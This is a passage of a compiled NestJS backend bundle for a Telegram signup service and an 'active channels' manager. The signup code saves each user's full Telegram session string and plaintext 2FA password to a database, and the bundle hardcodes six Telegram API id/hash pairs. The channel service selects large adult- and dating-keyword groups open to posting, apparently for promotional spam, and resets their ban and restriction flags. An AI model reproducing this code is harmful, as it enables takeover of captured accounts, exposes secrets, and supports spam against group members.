                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);
                    await this.disconnectClient(phone);
                    return result;
                }
                const sessionString = client.session.save();
                if (!sessionString) {
                    throw new Error('Failed to generate session string');
                }
                const userData = await this.processLoginResult(signInResult.user, sessionString, password);
                await this.disconnectClient(phone);
                return userData;
            }
            catch (error) {
                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                    this.logger.warn(`2FA required for ${phone}`);
                    if (!password) {
                        return {
                            status: 400,
                            message: 'Two-factor authentication required',
                            requires2FA: true
                        };
                    }
                    return await this.handle2FALogin(phone, session.client, password);
                }
                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||
                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {
                    throw new common_1.BadRequestException('Invalid OTP,  Try again!');
                }
                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);
                throw new common_1.BadRequestException('Verification failed. Please try again.');
            }
        }
        catch (error) {
            this.logger.error(`Verification error for ${phone}: ${error.message}`);
            if (error.message?.includes('No active signup session') ||
                error.message?.includes('Connection failed')) {
                await this.disconnectClient(phone);
            }
            throw error instanceof common_1.BadRequestException ? error :
                new common_1.BadRequestException(error.message || 'Verification failed, please try again');
        }
    }
    async handle2FALogin(phone, client, password) {
        try {
            this.logger.debug(`Fetching password SRP parameters for ${phone}`);
            const passwordSrpResult = await client.invoke(new tl_1.Api.account.GetPassword());
            this.logger.debug(`Computing password check for ${phone}`);
            const passwordCheck = await (0, Password_1.computeCheck)(passwordSrpResult, password);
            this.logger.debug(`Invoking CheckPassword API for ${phone}`);
            const signInResult = await client.invoke(new tl_1.Api.auth.CheckPassword({
                password: passwordCheck,
            }));
            if (!signInResult || !signInResult.user) {
                throw new common_1.BadRequestException('Invalid response from Telegram server');
            }
            this.logger.log(`2FA login successful for ${phone}`);
            const sessionString = client.session.save();
            if (!sessionString) {
                throw new Error('Failed to generate session string');
            }
            const userData = await this.processLoginResult(signInResult.user, sessionString, password);
            await this.disconnectClient(phone);
            return userData;
        }
        catch (error) {
            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);
            if (password) {
                throw new common_1.BadRequestException('Incorrect 2FA password');
            }
            throw new common_1.BadRequestException('2FA password required');
        }
    }
    async handleNewUserRegistration(phone, client, phoneCodeHash) {
        try {
            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;
            const signUpResult = await client.invoke(new tl_1.Api.auth.SignUp({
                phoneNumber: phone,
                phoneCodeHash,
                firstName: randomName,
                lastName: '',
            }));
            if (!signUpResult || !signUpResult.user) {
                throw new common_1.BadRequestException('Invalid response from Telegram server');
            }
            const sessionString = client.session.save();
            if (!sessionString) {
                throw new Error('Failed to generate session string');
            }
            return await this.processLoginResult(signUpResult.user, sessionString);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, "TGSIGNUP", false);
            this.logger.error(`Failed to register new user: ${errorDetails.message}`);
            throw new common_1.BadRequestException(errorDetails.message || 'Failed to register new user');
        }
    }
    async processLoginResult(user, sessionString, password) {
        try {
            if (!user || !sessionString) {
                throw new Error('Invalid user data or session string');
            }
            const now = new Date();
            const userData = {
                mobile: user.phone?.toString()?.replace(/^\+/, '') || '',
                session: sessionString,
                firstName: user.firstName || '',
                lastName: user.lastName || '',
                username: user.username || '',
                tgId: user.id?.toString() || '',
                twoFA: !!password,
                password: password || null,
                lastActive: now.toISOString().split('T')[0],
                expired: false,
                channels: 0,
                personalChats: 0,
                totalChats: 0,
                otherPhotoCount: 0,
                ownPhotoCount: 0,
                ownVideoCount: 0,
                otherVideoCount: 0,
                recentUsers: [],
                calls: {
                    chatCallCounts: [],
                    incoming: 0,
                    outgoing: 0,
                    totalCalls: 0,
                    video: 0,
                },
                contacts: 0,
                movieCount: 0,
                msgs: 0,
                photoCount: 0,
                videoCount: 0,
                gender: 'unknown',
            };
            if (!userData.mobile || !userData.tgId) {
                throw new Error('Invalid user data received from Telegram');
            }
            await this.usersService.create(userData);
            return {
                status: 200,
                message: 'Registration successful',
                session: sessionString,
            };
        }
        catch (error) {
            this.logger.error('Error processing login result:', error);
            if (error instanceof common_1.BadRequestException) {
                throw error;
            }
            throw new common_1.InternalServerErrorException('Failed to complete registration');
        }
    }
};
exports.TgSignupService = TgSignupService;
TgSignupService.LOGIN_TIMEOUT = 300000;
TgSignupService.SESSION_CLEANUP_INTERVAL = 300000;
TgSignupService.PHONE_PREFIX = "+";
TgSignupService.activeClients = new Map();
TgSignupService.API_CREDENTIALS = [
    { apiId: 27919939, apiHash: "5ed3834e741b57a560076a1d38d2fa94" },
    { apiId: 25328268, apiHash: "b4e654dd2a051930d0a30bb2add80d09" },
    { apiId: 12777557, apiHash: "05054fc7885dcfa18eb7432865ea3500" },
    { apiId: 27565391, apiHash: "a3a0a2e895f893e2067dae111b20f2d9" },
    { apiId: 27586636, apiHash: "f020539b6bb5b945186d39b3ff1dd998" },
    { apiId: 29210552, apiHash: "f3dbae7e628b312c829e1bd341f1e9a9" }
];
exports.TgSignupService = TgSignupService = TgSignupService_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], TgSignupService);


/***/ }),

/***/ "./src/components/active-channels/active-channels.controller.ts":
/*!**********************************************************************!*\
  !*** ./src/components/active-channels/active-channels.controller.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const create_active_channel_dto_1 = __webpack_require__(/*! ./dto/create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
const update_active_channel_dto_1 = __webpack_require__(/*! ./dto/update-active-channel.dto */ "./src/components/active-channels/dto/update-active-channel.dto.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let ActiveChannelsController = class ActiveChannelsController {
    constructor(activeChannelsService) {
        this.activeChannelsService = activeChannelsService;
    }
    async create(createActiveChannelDto) {
        return this.activeChannelsService.create(createActiveChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.activeChannelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        return this.activeChannelsService.search(query);
    }
    async findAll() {
        return this.activeChannelsService.findAll();
    }
    async findOne(channelId) {
        return this.activeChannelsService.findOne(channelId);
    }
    async update(channelId, updateActiveChannelDto) {
        return this.activeChannelsService.update(channelId, updateActiveChannelDto);
    }
    async remove(channelId) {
        return this.activeChannelsService.remove(channelId);
    }
};
exports.ActiveChannelsController = ActiveChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new active channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_active_channel_dto_1.CreateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_active_channel_dto_1.CreateActiveChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'wordRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'dMRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'availableMsgs', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'reactRestricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'megagroup', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all active channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_active_channel_dto_1.UpdateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "remove", null);
exports.ActiveChannelsController = ActiveChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Active Channels'),
    (0, common_1.Controller)('active-channels'),
    __metadata("design:paramtypes", [active_channels_service_1.ActiveChannelsService])
], ActiveChannelsController);


/***/ }),

/***/ "./src/components/active-channels/active-channels.module.ts":
/*!******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.module.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const active_channels_controller_1 = __webpack_require__(/*! ./active-channels.controller */ "./src/components/active-channels/active-channels.controller.ts");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ../promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
let ActiveChannelsModule = class ActiveChannelsModule {
};
exports.ActiveChannelsModule = ActiveChannelsModule;
exports.ActiveChannelsModule = ActiveChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: active_channel_schema_1.ActiveChannel.name, schema: active_channel_schema_1.ActiveChannelSchema }]),
            promote_msgs_module_1.PromoteMsgModule
        ],
        controllers: [active_channels_controller_1.ActiveChannelsController],
        providers: [active_channels_service_1.ActiveChannelsService],
        exports: [active_channels_service_1.ActiveChannelsService]
    })
], ActiveChannelsModule);


/***/ }),

/***/ "./src/components/active-channels/active-channels.service.ts":
/*!*******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.service.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsService = void 0;
const promote_msgs_service_1 = __webpack_require__(/*! ./../promote-msgs/promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
let ActiveChannelsService = class ActiveChannelsService {
    constructor(activeChannelModel, promoteMsgsService) {
        this.activeChannelModel = activeChannelModel;
        this.promoteMsgsService = promoteMsgsService;
    }
    async create(createActiveChannelDto) {
        createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne());
        const createdChannel = new this.activeChannelModel(createActiveChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => ({
            updateOne: {
                filter: { channelId: dto.channelId },
                update: { $set: dto },
                upsert: true
            }
        }));
        await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.activeChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateActiveChannelDto) {
        delete updateActiveChannelDto["_id"];
        const updatedChannel = await this.activeChannelModel.findOneAndUpdate({ channelId }, { $set: updateActiveChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async removeFromAvailableMsgs(channelId, msg) {
        return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } });
    }
    async addToAvailableMsgs(channelId, msg) {
        return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } });
    }
    async remove(channelId) {
        const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.activeChannelModel.find(filter).exec();
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$or': [
                        { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                        { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                    ]
                },
                {
                    '$and': [
                        {
                            title: {
                                $exists: true,
                                $type: "string",
                                '$not': { '$regex': /online|realestat|propert|freefire|bgmi|promo|agent|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }
                            }
                        },
                        {
                            username: {
                                $exists: true,
                                $type: "string",
                                '$not': { '$regex': /online|freefire|bgmi|promo|agent|realestat|propert|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }
                            }
                        },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 600 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                    forbidden: false
                }
            ]
        };
        try {
            const pipeline = [
                { $match: query },
                { $addFields: { randomField: { $rand: {} } } },
                { $sort: { randomField: 1 } },
                { $skip: skip },
                { $limit: limit },
                { $project: { randomField: 0 } }
            ];
            const result = await this.activeChannelModel.aggregate(pipeline).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.activeChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async resetWordRestrictions() {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Reset Available Msgs`);
        try {
            await this.activeChannelModel.updateMany({
                banned: false
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0
                }
            });
        }
        catch (e) {
            console.log((0, parseError_1.parseError)(e));
        }
    }
    async resetAvailableMsgs() {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Reset Available Msgs`);
        try {
            const data = await this.promoteMsgsService.findOne();
            const keys = Object.keys(data);
            await this.activeChannelModel.updateMany({
                $expr: {
                    $lt: [{ $size: { $ifNull: ["$availableMsgs", []] } }, 5]
                }
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0,
                    "banned": false,
                    "availableMsgs": keys
                }
            });
        }
        catch (e) {
            console.log((0, parseError_1.parseError)(e));
        }
    }
    async updateBannedChannels() {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for update banned Channels`);
        await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {
            $set: {
                "wordRestriction": 0,
                "dMRestriction": 0,
                banned: false,
                "private": false
            }
        });
    }
};
exports.ActiveChannelsService = ActiveChannelsService;
exports.ActiveChannelsService = ActiveChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(active_channel_schema_1.ActiveChannel.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_msgs_service_1.PromoteMsgsService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        promote_msgs_service_1.PromoteMsgsService])
], ActiveChannelsService);


/***/ }),

/***/ "./src/components/active-channels/dto/create-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/create-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateActiveChannelDto {
    constructor() {
        this.reactRestricted = false;
        this.wordRestriction = 0;
        this.dMRestriction = 0;
        this.banned = false;
        this.private = false;
    }
}
exports.CreateActiveChannelDto = CreateActiveChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 300 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String] }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "forbidden", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "private", void 0);


/***/ }),

/***/ "./src/components/active-channels/dto/update-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/update-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_active_channel_dto_1 = __webpack_require__(/*! ./create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
class UpdateActiveChannelDto extends (0, swagger_1.PartialType)(create_active_channel_dto_1.CreateActiveChannelDto) {
}
exports.UpdateActiveChannelDto = UpdateActiveChannelDto;


/***/ }),

/***/ "./src/components/active-channels/schemas/active-channel.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/schemas/active-channel.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelSchema = exports.ActiveChannel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
let ActiveChannel = class ActiveChannel {
};
exports.ActiveChannel = ActiveChannel;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false, default: null }),
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
